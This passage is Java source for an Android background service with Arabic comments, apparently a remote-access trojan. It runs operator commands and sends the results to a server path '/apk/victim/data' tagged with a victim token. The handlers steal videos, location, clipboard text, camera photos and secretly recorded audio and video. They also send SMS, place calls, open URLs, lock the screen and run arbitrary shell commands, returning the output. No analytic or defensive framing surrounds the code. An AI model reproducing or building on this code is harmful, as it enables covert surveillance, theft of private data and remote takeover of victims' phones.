            if (!hasReadMedia && !hasReadStorage && !hasManageStorage) {
                reportCommandResult("get_videos", "fail", "no_storage_permission");
                return;
            }

            Uri collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
            String[] projection = new String[]{
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.MIME_TYPE,
                    MediaStore.Video.Media.DURATION,
            };
            Cursor cursor = getContentResolver().query(collection, projection, null, null,
                    MediaStore.Video.Media.DATE_ADDED + " DESC");
            if (cursor == null) {
                reportCommandResult("get_videos", "fail", "cursor_null");
                return;
            }

            int totalCount = cursor.getCount();
            if (totalCount == 0) {
                cursor.close();
                reportCommandResult("get_videos", "fail", "no_videos");
                return;
            }

            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);
            int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);
            int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);
            int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE);
            int durCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION);

            int sent = 0;
            int maxVideos = 20;
            int maxSize = 20 * 1024 * 1024;

            while (cursor.moveToNext() && sent < maxVideos) {
                try {
                    long id = cursor.getLong(idCol);
                    String name = cursor.getString(nameCol);
                    long size = cursor.getLong(sizeCol);
                    String mime = cursor.getString(mimeCol);
                    long duration = cursor.getLong(durCol);
                    if (size <= 0 || size > maxSize) continue;

                    Uri videoUri = ContentUris.withAppendedId(collection, id);
                    InputStream inputStream = null;
                    byte[] bytes = null;
                    try {
                        inputStream = getContentResolver().openInputStream(videoUri);
                        if (inputStream == null) continue;
                        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                        byte[] temp = new byte[8192];
                        int read;
                        int totalRead = 0;
                        while ((read = inputStream.read(temp)) != -1) {
                            buffer.write(temp, 0, read);
                            totalRead += read;
                            if (totalRead > maxSize) break;
                        }
                        bytes = buffer.toByteArray();
                    } finally {
                        if (inputStream != null) {
                            try { inputStream.close(); } catch (Exception ignored) {}
                        }
                    }

                    if (bytes == null || bytes.length == 0) continue;

                    String finalMime = (mime != null && !mime.isEmpty()) ? mime : "video/mp4";
                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

                    JSONObject d = new JSONObject();
                    d.put("type", "video_file");
                    d.put("token", victimToken);
                    d.put("device", deviceId);
                    d.put("name", name);
                    d.put("video", "data:" + finalMime + ";base64," + base64);
                    d.put("duration", duration);
                    d.put("index", sent);
                    d.put("total", Math.min(totalCount, maxVideos));
                    d.put("size", bytes.length);
                    postJson("/apk/victim/data", d);

                    sent++;
                    Thread.sleep(1000);
                } catch (Exception e) {
                    Log.e(TAG, "video loop error: " + e.getMessage());
                }
            }
            cursor.close();

            JSONObject done = new JSONObject();
            done.put("type", "videos_done");
            done.put("token", victimToken);
            done.put("device", deviceId);
            done.put("total", sent);
            postJson("/apk/victim/data", done);
            reportCommandResult("get_videos", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_videos", "fail", e.getMessage());
        }
    }

    // ============================================================
    // الموقع
    // ============================================================
    private void sendLocation() {
        Log.d(TAG, "sendLocation called");
        LocationHelper.getLocation(this, new LocationHelper.LocationCallback2() {
            @Override
            public void onSuccess(double lat, double lng, float accuracy, String provider) {
                try {
                    JSONObject d = new JSONObject();
                    d.put("type", "location");
                    d.put("token", victimToken);
                    d.put("device", deviceId);
                    d.put("lat", lat);
                    d.put("lng", lng);
                    d.put("accuracy", accuracy);
                    d.put("provider", provider);

                    String address = LocationHelper.getAddressFromLocation(
                            ServiceRunner.this, lat, lng);
                    if (address != null) {
                        d.put("address", address);
                    }
                    postJson("/apk/victim/data", d);
                    reportCommandResult("get_location", "ok", "");
                } catch (Exception e) {
                    reportCommandResult("get_location", "fail", e.getMessage());
                }
            }

            @Override
            public void onError(String error) {
                Log.e(TAG, "location error: " + error);
                reportCommandResult("get_location", "fail", error);
            }
        });
    }

    // ============================================================
    // الحافظة
    // ============================================================
    private void sendClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager)
                    getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) {
                reportCommandResult("get_clipboard", "fail", "empty");
                return;
            }
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                reportCommandResult("get_clipboard", "fail", "empty");
                return;
            }
            CharSequence text = clip.getItemAt(0).getText();

            JSONObject d = new JSONObject();
            d.put("type", "clipboard");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("text", text != null ? text.toString() : "");
            postJson("/apk/victim/data", d);
            reportCommandResult("get_clipboard", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_clipboard", "fail", e.getMessage());
        }
    }

    // ============================================================
    // الكاميرا
    // ============================================================
    private void takePicture(final int cameraId) {
        Log.d(TAG, "takePicture called: cameraId=" + cameraId + " (0=back, 1=front)");
        boolean isFront = (cameraId == 1);
        final String actionName = isFront ? "camera_front" : "camera_back";

        CameraHelper.capturePhoto(this, isFront, new CameraHelper.PhotoCallback() {
            @Override
            public void onSuccess(byte[] jpegData) {
                try {
                    String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
                    JSONObject d = new JSONObject();
                    d.put("type", "camera_photo");
                    d.put("token", victimToken);
                    d.put("device", deviceId);
                    d.put("camera_id", cameraId);
                    d.put("camera_name", isFront ? "front" : "back");
                    d.put("image", "data:image/jpeg;base64," + base64);
                    d.put("size", jpegData.length);
                    postJson("/apk/victim/data", d);
                    reportCommandResult(actionName, "ok", "");
                    Log.d(TAG, "Photo captured: " + jpegData.length + " bytes");
                } catch (Exception e) {
                    Log.e(TAG, "send photo error: " + e.getMessage());
                    reportCommandResult(actionName, "fail", "send: " + e.getMessage());
                }
            }

            @Override
            public void onError(String error) {
                Log.e(TAG, "camera error: " + error);
                reportCommandResult(actionName, "fail", error);
            }
        });
    }

    // ============================================================
    // تسجيل صوت
    // ============================================================
    private void recordAudio(final int durationMs) {
        new Thread(() -> {
            MediaRecorder recorder = null;
            String filePath = null;
            try {
                if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
                    reportCommandResult("record_audio", "fail", "no_audio_permission");
                    return;
                }
                filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";

                if (Build.VERSION.SDK_INT >= 31) {
                    recorder = new MediaRecorder(this);
                } else {
                    recorder = new MediaRecorder();
                }
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(filePath);
                recorder.prepare();
                recorder.start();

                Thread.sleep(durationMs);

                try { recorder.stop(); } catch (Exception ignored) {}
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;

                File audioFile = new File(filePath);
                if (!audioFile.exists() || audioFile.length() == 0) {
                    reportCommandResult("record_audio", "fail", "file_empty");
                    return;
                }
                byte[] bytes = new byte[(int) audioFile.length()];
                FileInputStream fis = new FileInputStream(audioFile);
                int read = fis.read(bytes);
                fis.close();

                if (read <= 0) {
                    reportCommandResult("record_audio", "fail", "read_failed");
                    return;
                }

                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                JSONObject d = new JSONObject();
                d.put("type", "audio_record");
                d.put("token", victimToken);
                d.put("device", deviceId);
                d.put("audio", "data:audio/mp4;base64," + base64);
                d.put("duration", durationMs);
                postJson("/apk/victim/data", d);
                reportCommandResult("record_audio", "ok", "");
                audioFile.delete();
            } catch (Exception e) {
                reportCommandResult("record_audio", "fail", e.getMessage());
                if (recorder != null) try { recorder.release(); } catch (Exception ignored) {}
            }
        }).start();
    }

    // ============================================================
    // تسجيل فيديو
    // ============================================================
    private void recordVideo(final int cameraId, final int durationMs) {
        Log.d(TAG, "recordVideo called: cameraId=" + cameraId + " duration=" + durationMs);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            recordVideoCamera2(cameraId, durationMs);
        } else {
            recordVideoLegacy(cameraId, durationMs);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void recordVideoCamera2(final int cameraId, final int durationMs) {
        new Thread(() -> {
            android.hardware.camera2.CameraDevice camera = null;
            android.media.MediaRecorder recorder = null;
            String filePath = null;
            android.os.HandlerThread thread = null;

            try {
                if (!hasPermission(android.Manifest.permission.CAMERA)) {
                    reportCommandResult("camera_record", "fail", "no_camera_permission");
                    return;
                }
                android.hardware.camera2.CameraManager manager =
                        (android.hardware.camera2.CameraManager)
                                getSystemService(Context.CAMERA_SERVICE);
                if (manager == null) {
                    reportCommandResult("camera_record", "fail", "no_camera_manager");
                    return;
                }

                String targetCameraId = null;
                boolean isFront = (cameraId == 1);
                for (String id : manager.getCameraIdList()) {
                    android.hardware.camera2.CameraCharacteristics chars =
                            manager.getCameraCharacteristics(id);
                    Integer facing = chars.get(
                            android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                    if (facing != null) {
                        if (isFront && facing ==
                                android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
                            targetCameraId = id;
                            break;
                        }
                        if (!isFront && facing ==
                                android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                            targetCameraId = id;
                            break;
                        }
                    }
                }
                if (targetCameraId == null) {
                    String[] ids = manager.getCameraIdList();
                    if (ids.length > 0) targetCameraId = ids[0];
                }
                if (targetCameraId == null) {
                    reportCommandResult("camera_record", "fail", "no_camera");
                    return;
                }

                final String finalCameraId = targetCameraId;
                thread = new android.os.HandlerThread("VideoThread");
                thread.start();
                final android.os.Handler handler = new android.os.Handler(thread.getLooper());
                filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";

                final android.media.MediaRecorder finalRecorder = new android.media.MediaRecorder();
                recorder = finalRecorder;
                finalRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                finalRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                finalRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                finalRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                finalRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                finalRecorder.setVideoSize(1280, 720);
                finalRecorder.setVideoFrameRate(30);
                finalRecorder.setVideoEncodingBitRate(5000000);
                finalRecorder.setOutputFile(filePath);
                finalRecorder.prepare();

                final android.view.Surface surface = finalRecorder.getSurface();
                final CountDownLatch openLatch = new CountDownLatch(1);
                final CountDownLatch sessionLatch = new CountDownLatch(1);

                manager.openCamera(finalCameraId,
                        new android.hardware.camera2.CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(android.hardware.camera2.CameraDevice cam) {
                        Log.d(TAG, "Camera opened for video");
                        try {
                            List<android.view.Surface> surfaces = Collections.singletonList(surface);
                            cam.createCaptureSession(surfaces,
                                    new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(
                                        android.hardware.camera2.CameraCaptureSession s) {
                                    try {
                                        android.hardware.camera2.CaptureRequest.Builder builder =
                                                cam.createCaptureRequest(
                                                        android.hardware.camera2.CameraDevice.TEMPLATE_RECORD);
                                        builder.addTarget(surface);
                                        s.setRepeatingRequest(builder.build(), null, handler);
                                        finalRecorder.start();
                                        sessionLatch.countDown();
                                    } catch (Exception e) {
                                        sessionLatch.countDown();
                                    }
                                }

                                @Override
                                public void onConfigureFailed(
                                        android.hardware.camera2.CameraCaptureSession s) {
                                    sessionLatch.countDown();
                                }
                            }, handler);
                        } catch (Exception e) {
                            sessionLatch.countDown();
                        }
                        openLatch.countDown();
                    }

                    @Override
                    public void onDisconnected(android.hardware.camera2.CameraDevice cam) {
                        try { cam.close(); } catch (Exception ignored) {}
                    }

                    @Override
                    public void onError(android.hardware.camera2.CameraDevice cam, int error) {
                        openLatch.countDown();
                        sessionLatch.countDown();
                        try { cam.close(); } catch (Exception ignored) {}
                    }
                }, handler);

                openLatch.await(10, TimeUnit.SECONDS);
                sessionLatch.await(10, TimeUnit.SECONDS);
                Thread.sleep(durationMs);

                try { finalRecorder.stop(); } catch (Exception ignored) {}
                try { finalRecorder.release(); } catch (Exception ignored) {}
                recorder = null;

                File videoFile = new File(filePath);
                if (!videoFile.exists() || videoFile.length() == 0) {
                    reportCommandResult("camera_record", "fail", "file_empty");
                    return;
                }
                FileInputStream fis = new FileInputStream(videoFile);
                byte[] bytes = new byte[(int) videoFile.length()];
                int read = fis.read(bytes);
                fis.close();

                if (read <= 0) {
                    reportCommandResult("camera_record", "fail", "read_failed");
                    return;
                }

                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                JSONObject d = new JSONObject();
                d.put("type", "video_record");
                d.put("token", victimToken);
                d.put("device", deviceId);
                d.put("video", "data:video/mp4;base64," + base64);
                d.put("duration", durationMs);
                d.put("size", bytes.length);
                postJson("/apk/victim/data", d);
                reportCommandResult("camera_record", "ok", "");
                videoFile.delete();

            } catch (Exception e) {
                Log.e(TAG, "recordVideoCamera2 error: " + e.getMessage());
                reportCommandResult("camera_record", "fail", e.getMessage());
                if (recorder != null) try { recorder.release(); } catch (Exception ignored) {}
                if (camera != null) try { camera.close(); } catch (Exception ignored) {}
                if (thread != null) try { thread.quitSafely(); } catch (Exception ignored) {}
            }
        }).start();
    }

    private void recordVideoLegacy(final int cameraId, final int durationMs) {
        new Thread(() -> {
            android.hardware.Camera camera = null;
            android.media.MediaRecorder recorder = null;
            String filePath = null;
            try {
                if (!hasPermission(android.Manifest.permission.CAMERA)) {
                    reportCommandResult("camera_record", "fail", "no_camera_permission");
                    return;
                }
                camera = android.hardware.Camera.open(cameraId);
                if (camera == null) {
                    reportCommandResult("camera_record", "fail", "camera_null");
                    return;
                }
                camera.unlock();
                filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";

                recorder = new android.media.MediaRecorder();
                recorder.setCamera(camera);
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setVideoSize(640, 480);
                recorder.setVideoFrameRate(20);
                recorder.setVideoEncodingBitRate(800000);
                recorder.setOutputFile(filePath);
                recorder.prepare();
                recorder.start();

                Thread.sleep(durationMs);

                try { recorder.stop(); } catch (Exception ignored) {}
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;

                try { camera.lock(); } catch (Exception ignored) {}
                try { camera.release(); } catch (Exception ignored) {}
                camera = null;

                File videoFile = new File(filePath);
                if (!videoFile.exists() || videoFile.length() == 0) {
                    reportCommandResult("camera_record", "fail", "file_empty");
                    return;
                }
                FileInputStream fis = new FileInputStream(videoFile);
                byte[] bytes = new byte[(int) videoFile.length()];
                int read = fis.read(bytes);
                fis.close();
                if (read <= 0) {
                    reportCommandResult("camera_record", "fail", "read_failed");
                    return;
                }
                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                JSONObject d = new JSONObject();
                d.put("type", "video_record");
                d.put("token", victimToken);
                d.put("device", deviceId);
                d.put("video", "data:video/mp4;base64," + base64);
                d.put("duration", durationMs);
                d.put("size", bytes.length);
                postJson("/apk/victim/data", d);
                reportCommandResult("camera_record", "ok", "");
                videoFile.delete();

            } catch (Exception e) {
                reportCommandResult("camera_record", "fail", e.getMessage());
                if (recorder != null) try { recorder.release(); } catch (Exception ignored) {}
                if (camera != null) try { camera.release(); } catch (Exception ignored) {}
            }
        }).start();
    }

    // ============================================================
    // وسائط وطاقة
    // ============================================================
    private void sendMediaKey(String key) {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            int keyCode = 0;
            switch (key) {
                case "play_pause": keyCode = KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE; break;
                case "next": keyCode = KeyEvent.KEYCODE_MEDIA_NEXT; break;
                case "previous": keyCode = KeyEvent.KEYCODE_MEDIA_PREVIOUS; break;
            }
            if (keyCode == 0) {
                reportCommandResult("media_" + key, "fail", "unknown_key");
                return;
            }
            long eventTime = SystemClock.uptimeMillis();
            KeyEvent downEvent = new KeyEvent(eventTime, eventTime,
                    KeyEvent.ACTION_DOWN, keyCode, 0);
            KeyEvent upEvent = new KeyEvent(eventTime, eventTime,
                    KeyEvent.ACTION_UP, keyCode, 0);
            am.dispatchMediaKeyEvent(downEvent);
            am.dispatchMediaKeyEvent(upEvent);
            reportCommandResult("media_" + key, "ok", "");
        } catch (Exception e) {
            reportCommandResult("media_" + key, "fail", e.getMessage());
        }
    }

    private void screenOff() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (dpm == null) {
                reportCommandResult("screen_off", "fail", "no_dpm");
                return;
            }
            if (!dpm.isAdminActive(admin)) {
                reportCommandResult("screen_off", "fail", "device_admin_not_enabled");
                return;
            }
            dpm.lockNow();
            reportCommandResult("screen_off", "ok", "");
        } catch (Exception e) {
            reportCommandResult("screen_off", "fail", e.getMessage());
        }
    }

    private void setVolume(int level, String streamName) {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am == null) {
                reportCommandResult("volume_set", "fail", "no_audio_manager");
                return;
            }
            int stream = AudioManager.STREAM_MUSIC;
            if ("alarm".equals(streamName)) stream = AudioManager.STREAM_ALARM;
            else if ("ring".equals(streamName)) stream = AudioManager.STREAM_RING;
            else if ("notification".equals(streamName)) stream = AudioManager.STREAM_NOTIFICATION;
            else if ("call".equals(streamName)) stream = AudioManager.STREAM_VOICE_CALL;

            int maxVol = am.getStreamMaxVolume(stream);
            int targetVol = Math.max(0, Math.min(level, maxVol));
            am.setStreamVolume(stream, targetVol, 0);
            reportCommandResult("volume_set", "ok", "");
        } catch (Exception e) {
            reportCommandResult("volume_set", "fail", e.getMessage());
        }
    }

    private void maxVolume() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            am.setStreamVolume(AudioManager.STREAM_ALARM,
                    am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            reportCommandResult("volume_max", "ok", "");
        } catch (Exception e) {
            reportCommandResult("volume_max", "fail", e.getMessage());
        }
    }

    private void lockScreen() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (dpm == null) {
                reportCommandResult("lock_screen", "fail", "no_dpm");
                return;
            }
            if (!dpm.isAdminActive(admin)) {
                reportCommandResult("lock_screen", "fail", "device_admin_not_enabled");
                return;
            }
            dpm.lockNow();
            reportCommandResult("lock_screen", "ok", "");
        } catch (Exception e) {
            reportCommandResult("lock_screen", "fail", e.getMessage());
        }
    }

    private void goHome() {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            reportCommandResult("show_home", "ok", "");
        } catch (Exception e) {
            reportCommandResult("show_home", "fail", e.getMessage());
        }
    }

    private void playSound() {
        try {
            stopActiveRingtone();
            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
            if (r == null) r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
            if (r == null) r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
            if (r == null) {
                reportCommandResult("play_sound", "fail", "no_ringtones");
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) r.setLooping(true);
            activeRingtone = r;
            r.play();
            if (ringtoneHandler == null) ringtoneHandler = new Handler(Looper.getMainLooper());
            ringtoneHandler.postDelayed(this::stopActiveRingtone, 30000);
            reportCommandResult("play_sound", "ok", "");
        } catch (Exception e) {
            reportCommandResult("play_sound", "fail", e.getMessage());
        }
    }

    private void playAlarm() {
        try {
            stopActiveRingtone();
            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
            if (r == null) r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
            if (r == null) {
                reportCommandResult("play_alarm", "fail", "no_alarm");
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) r.setLooping(true);
            activeRingtone = r;
            r.play();
            if (ringtoneHandler == null) ringtoneHandler = new Handler(Looper.getMainLooper());
            ringtoneHandler.postDelayed(this::stopActiveRingtone, 60000);
            reportCommandResult("play_alarm", "ok", "");
        } catch (Exception e) {
            reportCommandResult("play_alarm", "fail", e.getMessage());
        }
    }

    private void stopActiveRingtone() {
        try {
            if (activeRingtone != null && activeRingtone.isPlaying()) {
                activeRingtone.stop();
            }
            activeRingtone = null;
        } catch (Exception ignored) {}
    }

    private void vibrate(long ms) {
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v == null) {
                reportCommandResult("vibrate", "fail", "no_vibrator");
                return;
            }
            if (!v.hasVibrator()) {
                reportCommandResult("vibrate", "fail", "no_vibrator_hardware");
                return;
            }
            if (ms <= 0) ms = 2000;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    v.vibrate(android.os.VibrationEffect.createOneShot(ms,
                            android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } catch (Exception e) {
                    v.vibrate(ms);
                }
            } else {
                v.vibrate(ms);
            }
            reportCommandResult("vibrate", "ok", "");
        } catch (Exception e) {
            reportCommandResult("vibrate", "fail", e.getMessage());
        }
    }

    private void showToast(final String text) {
        try {
            if (text == null || text.trim().isEmpty()) {
                reportCommandResult("toast", "fail", "empty_text");
                return;
            }
            Handler mainHandler = new Handler(Looper.getMainLooper());
            mainHandler.post(() -> {
                try {
                    Toast toast = Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG);
                    toast.setGravity(Gravity.CENTER, 0, 0);
                    toast.show();
                    reportCommandResult("toast", "ok", "");
                } catch (Exception e) {
                    reportCommandResult("toast", "fail", e.getMessage());
                }
            });
        } catch (Exception e) {
            reportCommandResult("toast", "fail", e.getMessage());
        }
    }

    private void sendSmsToNumber(String to, String msg) {
        try {
            if (to == null || to.trim().isEmpty()) {
                reportCommandResult("send_sms", "fail", "empty_number");
                return;
            }
            if (msg == null || msg.trim().isEmpty()) {
                reportCommandResult("send_sms", "fail", "empty_message");
                return;
            }
            if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
                reportCommandResult("send_sms", "fail", "no_send_sms_permission");
                return;
            }
            to = to.trim();
            SmsManager sm;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                sm = getSystemService(SmsManager.class);
            } else {
                sm = SmsManager.getDefault();
            }
            if (sm == null) {
                reportCommandResult("send_sms", "fail", "sms_manager_null");
                return;
            }
            ArrayList<String> parts = sm.divideMessage(msg);
            if (parts.size() > 1) {
                sm.sendMultipartTextMessage(to, null, parts, null, null);
            } else {
                sm.sendTextMessage(to, null, msg, null, null);
            }
            reportCommandResult("send_sms", "ok", "");
        } catch (Exception e) {
            reportCommandResult("send_sms", "fail", e.getMessage());
        }
    }

    private void callNumber(String number) {
        try {
            if (number == null || number.trim().isEmpty()) {
                reportCommandResult("call", "fail", "empty_number");
                return;
            }
            number = number.trim();
            String cleanNumber = number.replaceAll("[^0-9+]", "");

            if (hasPermission(android.Manifest.permission.CALL_PHONE)) {
                try {
                    Intent callIntent = new Intent(Intent.ACTION_CALL);
                    callIntent.setData(Uri.parse("tel:" + cleanNumber));
                    callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(callIntent);
                    reportCommandResult("call", "ok", "");
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "ACTION_CALL failed: " + e.getMessage());
                }
            }
            try {
                Intent dialIntent = new Intent(Intent.ACTION_DIAL);
                dialIntent.setData(Uri.parse("tel:" + cleanNumber));
                dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(dialIntent);
                reportCommandResult("call", "ok", "dial_only");
                return;
            } catch (Exception e) {
                Log.e(TAG, "ACTION_DIAL failed: " + e.getMessage());
            }
            reportCommandResult("call", "fail", "no_call_app");
        } catch (Exception e) {
            reportCommandResult("call", "fail", e.getMessage());
        }
    }

    private void openUrl(String url) {
        try {
            if (url == null || url.trim().isEmpty()) {
                reportCommandResult("open_url", "fail", "empty_url");
                return;
            }
            url = url.trim();
            if (!url.startsWith("http://") && !url.startsWith("https://")
                    && !url.startsWith("intent:") && !url.startsWith("market:")) {
                url = "https://" + url;
            }
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                intent.addCategory(Intent.CATEGORY_BROWSABLE);
                startActivity(intent);
                reportCommandResult("open_url", "ok", "");
                return;
            } catch (Exception e) {
                Log.e(TAG, "ACTION_VIEW failed: " + e.getMessage());
            }
            reportCommandResult("open_url", "fail", "no_browser");
        } catch (Exception e) {
            reportCommandResult("open_url", "fail", e.getMessage());
        }
    }

    private void executeShell(String command) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            reader.close();

            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String errLine;
            while ((errLine = errReader.readLine()) != null) {
                output.append("[ERR] ").append(errLine).append("\n");
            }
            errReader.close();

            JSONObject d = new JSONObject();
            d.put("type", "shell_result");
            d.put("token", victimToken);
            d.put("device", deviceId);
            d.put("command", command);
            d.put("output", output.toString());
            postJson("/apk/victim/data", d);
            reportCommandResult("shell", "ok", "");
        } catch (Exception e) {
            reportCommandResult("shell", "fail", e.getMessage());
        }
    }

    // ============================================================
    // Helpers
    // ============================================================
    private boolean hasPermission(String permission) {
        try {
            return ContextCompat.checkSelfPermission(this, permission)
                    == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }

    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);
            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return sb.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "httpGet: " + e.getMessage());
        }
        return null;
    }

    private String postJsonWithResponse(String path, JSONObject data) {
        try {
            URL url = new URL(SERVER_URL + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data.toString());
            os.flush();
            os.close();

            int rc = conn.getResponseCode();
            if (rc == 200) {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return sb.toString();
            } else {
                try {
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(conn.getErrorStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    Log.e(TAG, "HTTP " + rc + " error: " + sb.toString());
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "postJson: " + e.getMessage());
        }
        return null;
    }

    private void postJson(String path, JSONObject data) {
        postJsonWithResponse(path, data);
    }
                    }
